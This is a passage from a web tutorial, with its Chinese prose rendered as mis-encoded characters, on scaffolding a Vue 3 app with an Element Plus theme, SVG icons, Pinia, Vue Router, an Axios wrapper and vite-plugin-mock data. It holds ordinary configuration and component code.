      <span class="hljs-string">'base'</span>: <span class="hljs-number">#165dff</span>,
    ),
    <span class="hljs-string">'success'</span>: (
      <span class="hljs-string">'base'</span>: <span class="hljs-number">#009298</span>,
    ),
    <span class="hljs-string">'warning'</span>: (
      <span class="hljs-string">'base'</span>: <span class="hljs-number">#e6a23c</span>,
    ),
    <span class="hljs-string">'danger'</span>: (
      <span class="hljs-string">'base'</span>: <span class="hljs-number">#ff2664</span>,
    ),
    <span class="hljs-string">'error'</span>: (
      <span class="hljs-string">'base'</span>: <span class="hljs-number">#ff2664</span>,
    ),
    <span class="hljs-string">'info'</span>: (
      <span class="hljs-string">'base'</span>: <span class="hljs-number">#909399</span>,
    ),
  )
);
</code></pre>
<p>é…ç½® <code>vite.config.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">AutoImport</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-auto-import/vite'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ElementPlusResolver</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-vue-components/resolvers'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Components</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-vue-components/vite'</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(<span class="hljs-function">(<span class="hljs-params">{ mode }</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">plugins</span>: [
      <span class="hljs-title class_">AutoImport</span>({
        <span class="hljs-attr">resolvers</span>: [
          <span class="hljs-title class_">ElementPlusResolver</span>({
            <span class="hljs-attr">importStyle</span>: <span class="hljs-string">'sass'</span>, <span class="hljs-comment">// æ ¸å¿ƒä½œç”¨æ˜¯å‘Šè¯‰ Vite è‡ªåŠ¨å¯¼å…¥ Element Plus ç»„ä»¶çš„ SCSS æºç ï¼Œè€Œä¸æ˜¯ç¼–è¯‘å¥½çš„ CSS æ–‡ä»¶ï¼Œè¿™æ˜¯è‡ªå®šä¹‰ä¸»é¢˜ç”Ÿæ•ˆçš„å…³é”®ã€‚å¦‚æœä¸å†™ï¼ˆé»˜è®¤ï¼‰ï¼šæ’ä»¶ä¼šè‡ªåŠ¨å¯¼å…¥ç»„ä»¶å¯¹åº”çš„é¢„ç¼–è¯‘ .css æ–‡ä»¶ã€‚è¿™äº› CSS æ˜¯å·²ç»æ‰“åŒ…æ­»çš„ï¼ˆä¾‹å¦‚ä¸»è‰²å®šæ­»äº†æ˜¯ #409effï¼‰ï¼Œåœ¨é¡¹ç›®ä¸­å®šä¹‰çš„ SCSS å˜é‡æ— æ³•æ¸—é€è¿›å»ï¼Œä¸»é¢˜é…ç½®ä¼šå¤±æ•ˆ</span>
          }),
        ],
      }),
      <span class="hljs-title class_">Components</span>({
        <span class="hljs-attr">resolvers</span>: [
          <span class="hljs-comment">// è‡ªåŠ¨æ³¨å†Œ Element Plus ç»„ä»¶</span>
          <span class="hljs-title class_">ElementPlusResolver</span>({
            <span class="hljs-attr">importStyle</span>: <span class="hljs-string">'sass'</span>,
          }),
        ],
      }),
    ],
    <span class="hljs-attr">css</span>: {
      <span class="hljs-attr">preprocessorOptions</span>: {
        <span class="hljs-attr">scss</span>: {
          <span class="hljs-attr">additionalData</span>: <span class="hljs-string">`@use "@/styles/theme.scss" as *;`</span>,
        },
      },
    },
  }
})
</code></pre>
<h3 data-id="heading-8">æœ¬åœ°å›¾æ ‡</h3>
<p>å‰é¢è¯´äº†å¦‚ä½•ä½¿ç”¨ ElementPlus ï¼ˆç¬¬ä¸‰æ–¹ï¼‰çš„å›¾æ ‡ï¼Œå¦‚æœè¦ä½¿ç”¨æœ¬åœ° svg å›¾æ ‡ï¼Œéœ€è¦å®‰è£…æ’ä»¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D vite-plugin-svg-icons
</code></pre>
<p>æ­¤æ’ä»¶æ ¸å¿ƒä½œç”¨ï¼š</p>
<ol>
<li><strong>è‡ªåŠ¨æ‰«æç›®å½•</strong> â†’ é€’å½’è¯»å– <code>src/assets/icons/*.svg</code></li>
<li><strong>ç”Ÿæˆ SVG é›ªç¢§å›¾</strong> â†’ æ‰“åŒ…æˆ <strong>å•ä¸ª .js</strong> æ–‡ä»¶ï¼Œ<strong>å‡å°‘ HTTP è¯·æ±‚</strong></li>
<li><strong>ç»„ä»¶åŒ–è°ƒç”¨</strong> â†’ é€šè¿‡ <code>&lt;svg&gt;&lt;use href="#icon-name"&gt;&lt;/use&gt;&lt;/svg&gt;</code> å¼•ç”¨ï¼Œ<strong>é›¶é…ç½®</strong></li>
<li><strong>æŒ‰éœ€åŠ è½½</strong> â†’ <strong>åªæ‰“åŒ…ä½¿ç”¨çš„å›¾æ ‡</strong>ï¼Œ<strong>ä½“ç§¯â†“30%+</strong></li>
<li><strong>çƒ­æ›´æ–°</strong> â†’ <strong>ä¿®æ”¹ SVG â†’ é¡µé¢å®æ—¶åˆ·æ–°</strong></li>
<li><strong>æ ·å¼ç»§æ‰¿</strong> â†’ <strong>CSS æ”¹é¢œè‰²/å¤§å°</strong>ï¼Œ<strong>æ—  DOM æ“ä½œ</strong></li>
</ol>
<p>å¦‚æœä¼šæŠ¥é”™æç¤ºç¼ºå¤± <code>fast-glob</code> ä¾èµ–ï¼Œå®‰è£…ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D fast-glob
</code></pre>
<p><code>vite.config.js</code> ä¸­é…ç½®ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { fileURLToPath, <span class="hljs-variable constant_">URL</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'node:url'</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> { createSvgIconsPlugin } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-svg-icons'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// ...</span>
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">createSvgIconsPlugin</span>({
      <span class="hljs-attr">iconDirs</span>: [<span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'./src/assets/icons'</span>, <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>))],
      <span class="hljs-attr">symbolId</span>: <span class="hljs-string">'icon-[dir]-[name]'</span>,
    }),
  ],
})
</code></pre>
<p>å‡†å¤‡å›¾æ ‡ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">src/assets/icons/          â† æ”¾æ‰€æœ‰ .svg
â”œâ”€ home.svg
â”œâ”€ user.svg
â””â”€ logo.svg
</code></pre>
<p>æ–°å»º <code>src/components/SvgIcon.vue</code>ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">defineProps</span>({
  <span class="hljs-attr">name</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
    <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>,
  },
  <span class="hljs-attr">prefix</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
    <span class="hljs-attr">default</span>: <span class="hljs-string">'icon'</span>,
  },
  <span class="hljs-attr">className</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
    <span class="hljs-attr">default</span>: <span class="hljs-string">''</span>,
  },
})

<span class="hljs-keyword">const</span> symbolId = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-string">`#<span class="hljs-subst">${props.prefix}</span>-<span class="hljs-subst">${props.name}</span>`</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"className"</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">"true"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">use</span> <span class="hljs-attr">:href</span>=<span class="hljs-string">"symbolId"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
svg {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">1em</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">1em</span>;
  <span class="hljs-attribute">vertical-align</span>: -<span class="hljs-number">0.15em</span>; <span class="hljs-comment">/* å›  icon å¤§å°è¢«è®¾ç½®ä¸ºå’Œå­—ä½“å¤§å°ä¸€è‡´ï¼Œè€Œ span ç­‰æ ‡ç­¾çš„ä¸‹è¾¹ç¼˜ä¼šå’Œå­—ä½“çš„åŸºçº¿å¯¹é½ï¼Œæ•…éœ€è®¾ç½®ä¸€ä¸ªå¾€ä¸‹çš„åç§»æ¯”ä¾‹ï¼Œæ¥çº æ­£è§†è§‰ä¸Šçš„æœªå¯¹é½æ•ˆæœ */</span>
  fill: currentcolor; <span class="hljs-comment">/* æ”¯æŒå¤–éƒ¨ color/font-size æ§åˆ¶ */</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><code>main.js</code> å¼•å…¥ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-string">'virtual:svg-icons-register'</span> <span class="hljs-comment">// vite-plugin-svg-icons æ’ä»¶æ³¨å†Œï¼Œç”Ÿæˆé›ªç¢§å›¾å¹¶æ³¨å…¥ DOMï¼Œä¸å¼•å…¥ä¼šå¯¼è‡´ svg å›¾æ ‡æ— æ³•æ­£å¸¸æ˜¾ç¤º</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">SvgIcon</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/SvgIcon.vue'</span>

app.<span class="hljs-title function_">component</span>(<span class="hljs-string">'SvgIcon'</span>, <span class="hljs-title class_">SvgIcon</span>)
</code></pre>
<p>ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">SvgIcon</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"home"</span> /&gt;</span>
</code></pre>
<h3 data-id="heading-9">Pinia</h3>
<p>å®‰è£…ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">pnpm <span class="hljs-keyword">add</span> pinia
</code></pre>
<p>å¯ä»¥æŠŠ pinia çœ‹ä½œèˆ¹æ–°ç‰ˆæœ¬çš„ vuexï¼Œä½¿ç”¨ composition APIï¼Œç±»æ¯”ä¸€ä¸‹ï¼Œæ–°å»º <code>src/store/modules/index.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCounterStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'counter'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// ref -&gt; state</span>
  <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)

  <span class="hljs-comment">// computed -&gt; getters</span>
  <span class="hljs-keyword">const</span> double = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> count.<span class="hljs-property">value</span> * <span class="hljs-number">2</span>
  })

  <span class="hljs-comment">// function -&gt; actions</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) {
    count.<span class="hljs-property">value</span>++
  }

  <span class="hljs-keyword">return</span> { count, double, increment }
})
</code></pre>
<p>å¯¼å‡ºåˆ›å»ºçš„ store æ¨¡å—ï¼Œæ–°å»º  <code>src/store/index.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./modules/counter'</span>
</code></pre>
<p>main.js ä¸­å¼•å…¥ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createPinia } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>

app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">createPinia</span>())

app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<p>å®é™…ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- src/App.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useCounterStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store'</span>
<span class="hljs-keyword">const</span> counterStore = <span class="hljs-title function_">useCounterStore</span>()
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"counterStore.increment"</span>&gt;</span>çˆ¸çˆ¸ç‚¹æˆ‘<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">HelloWorld</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-comment">&lt;!-- src/components/HelloWorld.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useCounterStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store'</span>
<span class="hljs-keyword">const</span> counterStore = <span class="hljs-title function_">useCounterStore</span>()
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>æˆ‘è¢«ç‚¹äº†ï¼š{{ counterStore.count }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>åŠ å€ï¼š{{ counterStore.double }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<h3 data-id="heading-10">Vue Router</h3>
<p>å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add vue-router
</code></pre>
<p>æ–°å»º <code>src/router/index.js</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createRouter, createWebHistory } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-comment">// å¯¼å…¥å¸ƒå±€ç»„ä»¶ (åç»­åˆ›å»º)</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Layout</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/layout/index.vue'</span> 

<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Layout</span>,
    <span class="hljs-attr">redirect</span>: <span class="hljs-string">'/dashboard'</span>,
    <span class="hljs-attr">children</span>: [
      {
        <span class="hljs-attr">path</span>: <span class="hljs-string">'dashboard'</span>,
        <span class="hljs-attr">name</span>: <span class="hljs-string">'Dashboard'</span>,
        <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/views/dashboard/index.vue'</span>), <span class="hljs-comment">// è‡ªè¡Œåˆ›å»º</span>
        <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'é¦–é¡µ'</span> }
      }
    ]
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Login'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/views/login/index.vue'</span>), <span class="hljs-comment">// è‡ªè¡Œåˆ›å»º</span>
    <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'ç™»å½•'</span> }
  }
]

<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(),
  routes
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router
</code></pre>
<p>åœ¨ <code>src/main.js</code> ä¸­æ³¨å†Œè·¯ç”±ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./style.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
app.<span class="hljs-title function_">use</span>(router)
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<h3 data-id="heading-11">Axios</h3>
<p>å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add axios
</code></pre>
<p>æ–°å»º <code>src/utils/request.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store'</span>
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>

<span class="hljs-keyword">const</span> service = axios.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,
})

<span class="hljs-comment">// è¯·æ±‚æ‹¦æˆªå™¨</span>
service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">config</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()
    <span class="hljs-keyword">if</span> (userStore.<span class="hljs-property">token</span>) {
      config.<span class="hljs-property">headers</span>.<span class="hljs-property">token</span> = userStore.<span class="hljs-property">token</span>
    }
    <span class="hljs-keyword">return</span> config
  },
  <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)
  }
)

<span class="hljs-comment">// å“åº”æ‹¦æˆªå™¨</span>
service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> { code, message } = response.<span class="hljs-property">data</span>
    <span class="hljs-keyword">if</span> (code === <span class="hljs-number">200</span>) {
      <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>
    }

    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(message || <span class="hljs-string">'Error'</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(message || <span class="hljs-string">'Error'</span>))
  },
  <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">response</span>.<span class="hljs-property">data</span>) {
      <span class="hljs-keyword">const</span> { code, message } = error.<span class="hljs-property">response</span>.<span class="hljs-property">data</span>
      <span class="hljs-keyword">if</span> (code === <span class="hljs-number">500</span>) {
        <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">'å½“å‰é¡µé¢å·²å¤±æ•ˆï¼Œè¯·é‡æ–°ç™»å½•'</span>, <span class="hljs-string">'æç¤º'</span>, {
          <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">'ç¡®å®š'</span>,
          <span class="hljs-attr">type</span>: <span class="hljs-string">'warning'</span>,
        }).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">clear</span>()
          <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'/'</span>
        })
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(message || <span class="hljs-string">'Error'</span>)
      }
    }

    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error.<span class="hljs-property">message</span>)
  }
)

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> service
</code></pre>
<blockquote>
<p>éœ€è¦æ ¹æ®åç«¯å®é™…è¿”å›æ ¼å¼è°ƒæ•´ç›¸åº”éƒ¨åˆ†ä»£ç </p>
</blockquote>
<p>æ–°å»º <code>src/api/user.js</code> ï¼Œå¾…ä¼š mock æ•°æ®åæ¨¡æ‹Ÿè¯·æ±‚ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> request <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/request'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">login</span> = (<span class="hljs-params">data</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>({
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/user/login'</span>,
    <span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>,
    data,
  })
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getUserInfo</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>({
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/user/info'</span>,
    <span class="hljs-attr">method</span>: <span class="hljs-string">'get'</span>,
  })
}
</code></pre>
<h3 data-id="heading-12">Mock æ•°æ®</h3>
<p>å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D vite-plugin-mock mockjs
</code></pre>
<p><code>vite.config.js</code> ä¸­ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> { viteMockServe } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-mock'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(<span class="hljs-function">(<span class="hljs-params">{ mode }</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">plugins</span>: [
      <span class="hljs-comment">// ...</span>
      <span class="hljs-title function_">viteMockServe</span>({
        <span class="hljs-attr">mockPath</span>: <span class="hljs-string">'mock'</span>,
        <span class="hljs-attr">enable</span>: mode === <span class="hljs-string">'development'</span>,
      }),
    ],
  }
})
</code></pre>
<p>é¡¹ç›®æ ¹ç›®å½•ä¸‹æ–°å»º <code>mock/user.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> mockjs <span class="hljs-keyword">from</span> <span class="hljs-string">'mockjs'</span>

<span class="hljs-keyword">const</span> userList = mockjs.<span class="hljs-title function_">mock</span>({
  <span class="hljs-comment">// å±æ€§ list çš„å€¼æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­å«æœ‰ 1 åˆ° 10 ä¸ªå…ƒç´ </span>
  <span class="hljs-string">'list|1-10'</span>: [
    {
      <span class="hljs-comment">// éšæœºç”Ÿæˆidå·</span>
      <span class="hljs-attr">id</span>: <span class="hljs-string">'@id'</span>,
      <span class="hljs-comment">// éšæœºç”Ÿæˆä¸­æ–‡å§“å</span>
      <span class="hljs-attr">name</span>: <span class="hljs-string">'@cname'</span>,
      <span class="hljs-comment">// å±æ€§ id æ˜¯ä¸€ä¸ªè‡ªå¢æ•°ï¼Œèµ·å§‹å€¼ä¸º 1ï¼Œæ¯æ¬¡å¢ 1</span>
      <span class="hljs-string">'id|+1'</span>: <span class="hljs-number">1</span>,
      <span class="hljs-comment">// éšæœºç”Ÿæˆipåœ°å€</span>
      <span class="hljs-attr">ip</span>: <span class="hljs-string">'@ip'</span>,
      <span class="hljs-comment">// éšæœºç”Ÿæˆçœå¸‚åŒºåœ°å€</span>
      <span class="hljs-attr">address</span>: <span class="hljs-string">'@county(true)'</span>,
      <span class="hljs-comment">// éšæœºç”Ÿæˆé‚®æ”¿ç¼–ç </span>
      <span class="hljs-attr">zip</span>: <span class="hljs-string">'@zip'</span>,
      <span class="hljs-comment">// éšæœºç”Ÿæˆ18-70ä¹‹é—´çš„å¹´é¾„</span>
      <span class="hljs-string">'age|18-70'</span>: <span class="hljs-number">20</span>,
      <span class="hljs-comment">// éšæœºç”Ÿæˆæ—¥æœŸ</span>
      <span class="hljs-attr">date</span>: <span class="hljs-string">'@date("yyyy-MM-dd")'</span>,
      <span class="hljs-comment">// éšæœºç”Ÿæˆå¤´åƒ</span>
      <span class="hljs-attr">avatar</span>: <span class="hljs-string">"@image('')"</span>,
    },
  ],
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> [
  {
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/user/list'</span>,
    <span class="hljs-attr">method</span>: <span class="hljs-string">'get'</span>,
    <span class="hljs-attr">response</span>: <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">code</span>: <span class="hljs-number">200</span>,
        <span class="hljs-attr">data</span>: userList,
      }
    },
  },
]
</code></pre>
<p>æ‰§è¡Œ <code>pnpm dev</code>ï¼Œ<code>vite-plugin-mock</code> ä¼šæ ¹æ®ä½ æä¾›çš„ mock æ•°æ®è‡ªåŠ¨ä»£ç†æ¥å£ã€‚æ­¤æ—¶ï¼Œä½ å°±å¯ä»¥åœ¨å‰ç«¯ä»£ç ä¸­æ­£å¸¸è¯·æ±‚ <code>/api/user</code>ï¼Œå¹¶ä¸”è·å–åˆ°æ¨¡æ‹Ÿçš„å“åº”æ•°æ®ï¼Œä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { getUserList } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/user'</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">getData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getUserList</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)
}

<span class="hljs-title function_">getData</span>()
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c004ebf01f3a40058b17722404b8040e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5oyW5Zyf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461042&amp;x-signature=33L%2BUbBRycUhM10K9ihGCz41bWw%3D" alt="userlist.png" loading="lazy"/></p>
<h3 data-id="heading-13">æ­å»ºåŸºç¡€å¸ƒå±€ (Layout)</h3>
<p>å‡†å¤‡ç”¨ AI å†™ä¸ªç®€å•å¸ƒå±€é¡µé¢ï¼Œæ–°å»º <code>src/layout/index.vue</code>ï¼š</p>
